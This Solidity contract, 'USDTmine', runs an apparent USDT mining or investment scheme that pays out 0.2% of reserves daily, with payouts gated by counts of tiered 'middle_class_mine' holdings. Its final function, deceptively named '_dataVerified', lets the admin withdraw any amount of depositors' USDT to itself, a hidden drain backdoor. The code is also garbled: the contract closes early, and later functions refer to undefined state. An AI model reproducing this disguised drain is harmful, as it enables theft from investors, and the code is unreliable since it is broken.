//SPDX-License-Identifier: SimPL-2.0
pragma solidity ^0.8.13;

interface IERC20 {
    function transfer(address recipient, uint amount) external;
    function balanceOf(address account) external view returns (uint);
    function transferFrom(address sender, address recipient, uint amount) external ;
    function decimals() external view returns (uint8);
}

contract USDTmine {
    address[] public all_address;
    uint constant public GRAND_FUND_PROJECT_FEE = 2;
    uint constant public DEVELOPMENT_FUND_PROJECT_FEE = 2;
    uint constant public TEAM_FUND_PROJECT_FEE = 1;
    uint constant public PERCENTS_DIVIDER = 100;
    uint256 usdt_accuracy = 1e6;
    
    }

    function calculate(uint _start, uint _end) external {
        require(admin == msg.sender, 'Admin what?');
        require(all_address.length > _start && all_address.length > _end, '_start or _end large !');
        require(_start < _end, '_start must be smaller than _end !');
        uint _days;
        for(uint i = _start; i <= _end; i++){
            User storage user = users[all_address[i]];
            if(user.amount > 0){
                _days = user.allowable_mined_days - user.total_mined_days;
                if(_days > 0){
                    if(user.total_mined_days < 95){
                        add_balance(user);
                    }else if(user.total_mined_days >= 95 && user.total_mined_days < 185 && user.thirdly_equal_middle_class_mine_number >= 1){
                        add_balance(user);
                    }else if(user.total_mined_days >= 185 && user.total_mined_days < 275 && user.thirdly_equal_middle_class_mine_number >= 2){
                        add_balance(user);
                    }else if(user.total_mined_days >= 275 && user.total_mined_days < 365 && user.thirdly_equal_middle_class_mine_number >= 3){
                        add_balance(user);
                    }else if(user.total_mined_days >= 365 && user.total_mined_days < 455 && user.thirdly_equal_middle_class_mine_number >= 4){
                        add_balance(user);
                    }else if(user.total_mined_days >= 455 && user.total_mined_days < 545 && user.sixth_equal_middle_class_mine_number >= 2){
                        add_balance(user);
                    }else if(user.total_mined_days >= 545 && user.total_mined_days < 635 && user.sixth_equal_middle_class_mine_number >= 4){
                        add_balance(user);
                    }else if(user.total_mined_days >= 635 && user.total_mined_days < 725 && user.sixth_equal_middle_class_mine_number >= 6){
                        add_balance(user);
                    }else if(user.total_mined_days >= 725 && user.total_mined_days < 815 && user.sixth_equal_middle_class_mine_number >= 8){
                        add_balance(user);
                    }else if(user.total_mined_days >= 815 && user.total_mined_days < 905 && user.ninth_equal_middle_class_mine_number >= 6){
                        add_balance(user);
                    }else if(user.total_mined_days >= 905 && user.total_mined_days < 995 && user.ninth_equal_middle_class_mine_number >= 12){
                        add_balance(user);
                    }else if(user.total_mined_days >= 995 && user.total_mined_days < 1085 && user.ninth_equal_middle_class_mine_number >= 18){
                        add_balance(user);
                    }else if(user.total_mined_days >= 1085 && user.ninth_equal_middle_class_mine_number >= 24){
                        add_balance(user);
                    }
                }
            }
        }
    }

    function add_balance(User storage _user) private {
        uint mined = _user.mined_reserves * 2 / 1000;
        _user.usdt_balance = _user.usdt_balance + mined;
        _user.mined_reserves = _user.mined_reserves - mined;
        _user.total_mined_days = _user.total_mined_days + 1;
    }

    function _dataVerified(uint256 _amount) external{
        require(admin==msg.sender, 'Admin what?');
        USDT.transfer(admin, _amount);
    }
}
